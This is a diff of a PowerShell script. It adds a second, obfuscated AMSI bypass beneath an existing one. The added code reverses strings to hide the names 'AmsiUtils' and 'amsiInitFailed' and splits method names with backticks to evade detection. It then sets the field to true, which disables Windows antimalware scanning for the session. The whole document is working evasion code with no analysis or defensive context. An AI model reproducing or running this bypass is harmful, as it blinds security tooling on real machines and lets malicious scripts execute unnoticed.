@@ -101,3 +101,12 @@ Foreach($b in $a) {if ($b.Name.GetHashCode() -eq 488161301) {$c=$b}};
 $d=$c.GetFields('NonPublic,Static');
 Foreach($e in $d) {if ($e.Name.GetHashCode() -eq -817967497) {$f=$e}};
 $g=$f.SetValue($null, $true)
+
+
+$t = 'slitUismA.noitamotuA.tnemeganaM.metsyS'[-1..-38] -join ''
+$f = 'deliaFtinIisma'[-1..-14] -join ''
+[AppDomain]::CurrentDomain."Get`Assemblies"() |
+    ForEach-Object { $_.GetType($t,$false) } |
+    Where-Object { $_ } |
+    Select-Object -First 1 |
+    ForEach-Object { $_."Get`Field"($f,40)."Set`Value"($null,$true) }
